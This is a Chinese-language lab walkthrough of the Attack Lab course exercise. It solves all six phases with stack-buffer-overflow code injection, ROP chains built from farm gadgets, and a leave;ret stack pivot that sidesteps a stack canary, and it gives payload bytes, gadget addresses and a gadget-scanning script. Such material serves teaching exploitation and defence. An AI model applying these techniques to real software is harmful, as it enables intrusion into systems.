0. 实验导览

Attack Lab 是 ICS 的第三个实验：前三个 phase 让你往 ctarget 的栈上注入并执行自己的机器码；后三个 phase 面对开启了栈不可执行（NX）的 rtarget / starget，只能用程序里现成的指令片段（gadget）拼出 return-oriented programming（ROP）链。本页把六个 phase 的拆解思路、栈布局、gadget 地址和可直接使用的 payload 全部整理出来。

这个实验考什么

不给源码，只给三个 ELF 可执行文件和一个 farm.c。你需要读懂 getbuf 的栈帧，算出返回地址的位置，再决定是注入代码、还是拼 ROP 链。

它对应教材里「机器级编程」与「缓冲区溢出」两章：栈帧、call/ret、寄存器传参、字节序、变长指令解码，缺一不可。

1. 攻击面：getbuf 的栈帧

所有 phase 的起点都是同一个函数：getbuf。它用 Gets 往栈上的固定缓冲区里读一行，完全不检查长度——这就是整条攻击链的入口。

1.1 反汇编

0000000000401c30 <getbuf>:
  401c30:   endbr64
  401c34:   sub    $0x18,%rsp        ; 在栈上开 24 字节
  401c38:   mov    %rsp,%rdi          ; 缓冲区 = 当前 rsp
  401c3b:   call   401f97 <Gets>      ; 读一行，无长度检查
  401c40:   mov    $0x1,%eax
  401c45:   add    $0x18,%rsp
  401c49:   ret                       ; 从 [rsp] 取返回地址

sub $0x18,%rsp 之后，rsp 指向缓冲区首字节；函数返回时，ret 从 rsp + 0x18 弹出返回地址。也就是说：

payload = 24 字节填充 + 8 字节目标地址

24 字节填充可以是任意字节；第 25–32 字节会覆盖 getbuf 的返回地址。若只写 24 字节，ret 仍然回到 test，程序打印 No exploit. Getbuf returned 0x1。

1.2 内存布局

rsp + 0x00
buffer[0 … 23]：Gets 的写入区
24 字节
rsp + 0x18
saved return address
ret 从这里弹出
rsp + 0x20
test 的栈帧 / 调用者的数据
返回后由 test 继续使用

1.3 怎么拿到缓冲区地址

在 gdb 里让程序停在 sub $0x18,%rsp 之后，直接读 $rsp：

$ gdb -q ./ctarget
(gdb) disas getbuf
(gdb) b *0x401c38          # 本实例：sub 之后、mov 之前
(gdb) run -q -i phase1.raw
(gdb) p/x $rsp             # 本实例得到 0x55639868

ctarget 的 main 调用的是 stable_launch，它把栈映射到固定的 0x55586000 附近，所以这个地址在本实例里是稳定的。换一个 tar，buf_offset 变了，地址也会变。

rtarget / starget 不需要这个地址
rtarget 与 starget 仍然用普通栈（ASLR 会改变地址），但第 4–6 关的链都通过 mov rax,rsp 或 leave 在运行时现算栈地址，所以 payload 里不需要写死缓冲区地址。这也是它们能在 ASLR 开启时通过的原因。

1.4 hex2raw 的输入格式

hex2raw 读的是「十六进制字节文本」：空白分隔，# 不是注释，遇到非十六进制字符会报错。每个 payload 都应存成纯字节序列，例如：

41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 bc 1c 40 00 00 00 00 00

转换与运行：

$ ./hex2raw < phase1.txt > phase1.raw
$ chmod +x ctarget rtarget starget hex2raw   # 若解包后丢了执行位
$ ./ctarget -q -i phase1.raw
常见坑：文件末尾的换行
hex2raw 会忽略空白，所以文本末尾多一个换行没关系；但不要在里面写 0x41（带 0x 前缀）——它只认两位十六进制。页内生成器输出的就是可直接喂给 hex2raw 的格式。

3. Phase 2：注入代码，给 touch2 传 cookie

这次不能只改返回地址：touch2 会比较第一个参数 %edi 和 cookie。你得在缓冲区里放一小段机器码，先把 cookie 装进 %edi，再跳到 touch2。

目标：执行 0x401cf0 <touch2>，且 %edi == 0x29b55047。成功时打印 Touch2!: You called touch2(0x29b55047)。

3.1 touch2 在比较什么

0000000000401cf0 <touch2>:
  401cf0:   endbr64
  401cf4:   push   %rax
  401cf5:   pop    %rax
  401cf6:   sub    $0x8,%rsp
  401cfa:   mov    %edi,%edx
  401cfc:   movl   $0x2,0x481e(%rip)      # vlevel = 2
  401d06:   cmp    %edi,0x4820(%rip)      # 比较 cookie 和 %edi
  401d0c:   je     401d38 <touch2+0x48>
  ...                                  # 不相等就 fail

getbuf 返回时，%rdi 里还残留着 Gets 用过的指针（指向缓冲区），不是 cookie。所以必须自己设置 %edi。

3.2 注入的指令

用一条 mov $imm32,%edi 加一条 ret：

BF 47 50 B5 29 C3  =  mov $0x29b55047,%edi ; ret

这 6 个字节放在缓冲区开头。注意 getbuf 的 ret 跳到缓冲区后，rsp 已经指向 buffer + 32；注入代码最后的 ret 会从 buffer + 32 取下一个地址。因此布局是：

buffer + 0
BF 47 50 B5 29 C3
mov + ret（6 字节）
buffer + 6
填充到 24 字节
任意字节
buffer + 24
buffer 的地址（0x55639868）
getbuf 的 ret 弹到这里

touch2 的地址（0x401cf0）
注入代码的 ret 弹到这里

为什么 buffer + 24 不直接放 touch2？因为 getbuf 的 ret 只负责跳到缓冲区；跳到缓冲区后，CPU 先执行你的 mov，再执行你的 ret，那时 rsp 已经前进到 buffer + 32。把 touch2 放在 +32，才能被第二条 ret 正确弹出。

4. Phase 3：注入字符串，给 touch3 传指针

这一关把参数从「整数」换成「字符串指针」：touch3 要求 %rdi 指向一个内容为 cookie 十六进制串的 C 字符串。代码比上一关长一点，真正的坑在字符串放哪。

目标：执行 0x401e16 <touch3>，且 %rdi 指向 "29b55047\0"。成功时打印 Touch3!: You called touch3("29b55047")。

4.1 touch3 / hexmatch

touch3 把 %rdi 原样传给 hexmatch(cookie, s)；hexmatch 用 sprintf("%.8x", cookie) 生成 8 位小写十六进制，再用 strncmp(..., 9) 比较，包含结尾的 \0。所以字符串必须是 8 位小写十六进制、以 NUL 结尾。

4.2 注入的指令与布局

用 movabs 把 64 位字符串地址装进 %rdi：

48 BF <字符串地址> C3  =  movabs $地址,%rdi ; ret

字符串放在 buffer + 40：

4.3 为什么字符串不能放在 buffer + 16

这是本关最经典的错误。把字符串放在 buffer + 16 时，它正好落在 touch3 / hexmatch 的栈帧会覆盖的区域：

buffer + 0
movabs 代码（10 字节）

buffer + 16
会被 call/ push 覆盖
touch3 的返回地址、hexmatch 的 push 都落在这里

返回地址槽
执行时已被消费
buffer + 40
字符串放这里
在 touch3 入口的 rsp 之上，不会被压栈覆盖

实测把 "29b55047" 放在 buffer + 16，touch3 收到的指针虽然正确，但读到的内容已经被栈帧破坏，输出类似 Misfire: You called touch3("…")。放到 buffer + 40 就稳定通过。

字符串地址要跟着缓冲区地址走
本页生成器用 buffer + 40 计算 movabs 的立即数。如果你改了「ctarget 缓冲区地址」，代码里的 90 98 63 55 … 会同步变化；不要手动只改一处。

5. 从 ret 到 ROP：gadget farm

rtarget 和 starget 的栈不可执行（NX），把代码写进缓冲区再跳过去会直接段错误。攻击者剩下的武器是程序自己已经编译好的指令片段：gadget。每个 gadget 以 ret 结尾，把它们的地址依次排在栈上，就能让 CPU 像「返回」一样一串串执行下去。

5.1 gadget 不必是函数

x86-64 是变长指令集：从一条指令的中间某个字节开始解码，可能得到完全不同的指令。下面这段 getval_418 的本意是 mov $0x58a5cb24,%eax，但它的立即数里藏着 58 c3：

0000000000401f15 <getval_418>:
  401f15:   f3 0f 1e fa          endbr64
  401f19:   b8 24 cb a5 58       mov    $0x58a5cb24,%eax
  401f1e:   c3                   ret

从 0x401f1d 开始读，字节是 58 c3，也就是：

0x401f1d: 58 c3  =  pop %rax ; ret

这就是为什么不能只靠 objdump 的正常反汇编找 gadget——它不会把指令中间的字节单独列出来。要找 pop rdi; ret（5f c3）、pop rsi; ret（5e c3）这类序列，得按字节扫。

5.2 本实例 rtarget 可用的 gadget

地址字节指令用途
0x401f1d58 c3pop %rax ; ret把栈上的 8 字节装进 rax
0x401f1148 89 c7 c3mov %rax,%rdi ; ret把 rax 传给第一个参数
0x401f6f91 c3xchg %eax,%ecx ; ret把低 32 位转到 ecx
0x401f6d89 ce 91 c3mov %ecx,%esi ; xchg %eax,%ecx ; ret把 ecx 装进 esi（第二个参数）
0x401f8e48 89 e0 c3mov %rsp,%rax ; ret拿到当前栈指针
0x401f52f3 0f 1e fa 48 8d 04 37 c3endbr64 ; lea (%rdi,%rsi,1),%rax ; retadd_xy：rax = rdi + rsi
0x401c7e—touch2第 4 关目标
0x401da4—touch3第 5 关目标

这些地址来自本实例的 rtarget。farm 的范围是 0x401eea <start_farm> 到 0x4020b3 <end_farm>；按实验规则只应使用 farm 里的 gadget。注意 starget 的 farm 布局与本文件不同，地址要单独取（见 §8.4）。

5.3 怎么自己找 gadget

先反汇编 farm 并带上原始字节：

$ objdump -d -M intel --start-address=0x401eea --stop-address=0x4020b3 rtarget

再按字节模式搜索。例如要找 pop %rax; ret，就是找 58 c3；要找 mov %rax,%rdi; ret，就是找 48 89 c7 c3。下面这段脚本把整个 .text 读出来做模式匹配，适合确认地址：

$ python3 - <<'PY'
import subprocess, re
subprocess.run(['objcopy','-O','binary','--only-section=.text','rtarget','/tmp/t.bin'],check=True)
data = open('/tmp/t.bin','rb').read()
base = 0x401240          # .text 的 VMA
for name, pat in {
    'pop rax; ret'      : b'\x58\xc3',
    'mov rdi,rax; ret'  : b'\x48\x89\xc7\xc3',
    'mov rax,rsp; ret'  : b'\x48\x89\xe0\xc3',
    'xchg eax,ecx; ret' : b'\x91\xc3',
}.items():
    print(name, [hex(base + m.start()) for m in re.finditer(re.escape(pat), data)])
PY

注意 base 不是 0x401000：.text 的 VMA 是 0x401240（用 readelf -S rtarget 确认）。如果反汇编器/脚本给出的地址整体偏移，先对一下 start_farm 的地址。

ROP 链就是一张 qword 表
每个 gadget 的地址占 8 字节，后面跟着它要 pop 的数据。CPU 执行 ret 时自动把 rsp 加 8，所以链会自然往下走。写 payload 时，本质上是把「地址、数据、地址、数据……」按小端序铺在栈上。

6. Phase 4：ROP 调用 rtarget 的 touch2

目标与 ctarget 的 phase 2 一样：让 touch2(cookie) 通过。但这次不能注入 mov，只能用 farm 里的 gadget 把 cookie 装进 %edi。

目标：执行 0x401c7e <touch2>，且 %edi == 0x29b55047。成功时打印 Touch2!: You called touch2(0x29b55047)，并显示 level 2 with target rtarget。

6.1 为什么不用 pop rdi

最直觉的链是 pop rdi; ret + cookie + touch2，但本实例的 farm 里没有 5f c3。有 pop rax; ret（58 c3）和 mov rdi,rax; ret（48 89 c7 c3），所以改成：

pop rax ; cookie ; mov rdi,rax ; touch2

先把 cookie 弹进 rax，再整体搬到 rdi。这两条 gadget 都在 farm 里，且不需要知道栈地址。

为什么不怕 ASLR
这条链只用了代码段里的固定地址和立即数 cookie，没有任何栈地址。即使 rtarget 的栈每次运行都不同，链也照样工作。

7. Phase 5：ROP 调用 rtarget 的 touch3

这一关的 ROP 要把 %rdi 指向栈上的字符串 "29b55047"。难点是 farm 里既没有 pop rdi，也没有 pop rsi；你得用 rsp 和 add_xy 现算地址。

目标：执行 0x401da4 <touch3>，且 %rdi 指向 "29b55047\0"。成功时显示 level 3 with target rtarget。

7.1 思路：先拿 rsp，再加偏移

链执行到 mov %rsp,%rax 时，rsp 正好指向链里的下一个 qword。把这个值当作基准，加上字符串相对它的偏移，就得到字符串地址。计算需要两个操作数，于是：

  1. pop rax 把偏移量（本例 32）装进 rax；
  2. xchg eax,ecx 把偏移转到 ecx；
  3. mov esi,ecx 把它装进第二个参数 rsi；
  4. mov rax,rsp 拿到基准地址，mov rdi,rax 放进第一个参数；
  5. add_xy 算出 rax = rdi + rsi；
  6. mov rdi,rax 把结果传给 touch3。

7.2 偏移为什么是 32

链从 buffer + 24 开始。执行到 mov rax,rsp 这条 gadget（位于 buffer + 56）时，ret 已经把 rsp 推到 buffer + 64。字符串放在 buffer + 96，所以：

96 − 64 = 32

如果你在链中增删 gadget，这个偏移必须跟着重算；不要无脑抄 32。

8. Phase 6：绕过 canary，调用 starget 的 touch3

starget 在 getbuf_withcanary 里放了栈保护：缓冲区后面有一个从 %fs:0x28 取来的 canary，函数返回前会检查它。直接覆盖返回地址会先触发 __stack_chk_fail。这一关的突破口不是猜 canary，而是函数里那次 memcpy。

目标：执行 0x401dab <touch3>，且 %rdi 指向 "29b55047\0"。成功时显示 level 3 with target starget。

缓冲区只有 160 字节，但 Gets 不检查长度；输入超过 152 字节就会碰到 canary，超过 160 字节会覆盖 saved rbp，超过 168 字节会覆盖返回地址。可是 canary 是随机值，没有泄露函数，猜不中——覆盖它只会得到：

Ouch!: You change the canary value!

8.2 突破口：memcpy 自己的返回地址

getbuf_withcanary 在 Gets 之后调用了一次 memcpy(dst, src, 128)，而 dst 由输入中的 offset 决定：

dst = (rbp − 0x120) + offset

offset 是 32 位有符号整数，可以取负。选 offset = −24：

dst = rbp − 0x120 − 0x18 = rbp − 0x138

memcpy 的调用发生在 call memcpy，返回地址被压在 rbp − 0x128。它正好是 dst + 0x10，也就是输入的第 16–23 字节。于是：

input[16..23] = leave; ret 的地址  →  memcpy 返回时直接跳到 leave; ret

leave 执行 rsp = rbp; pop rbp; ret，把栈枢轴到 getbuf_withcanary 的 saved rbp / return address，也就是输入偏移 160 / 168 的位置。canary 检查发生在 memcpy 之后，但此时 CPU 已经被劫持，根本走不到检查。

这不是「绕过 canary 的值」，而是「绕过 canary 的检查点」
不需要知道 canary，也不需要覆盖它之后还能返回。攻击发生在 canary 检查之前，属于典型的「利用函数内部写原语改写控制流」。

三个最容易错的点
① offset 写成了 0x18 而不是 −24：那会写到 rbp − 0x108，覆盖不到 memcpy 的返回地址；② 把 leave;ret 放在输入偏移 24 而不是 16：memcpy 返回地址在 dst + 0x10，不是 dst；③ 用了 rtarget 的 gadget 地址：starget 的 farm 后移，pop rax 在 0x401f24 而不是 0x401f1d。
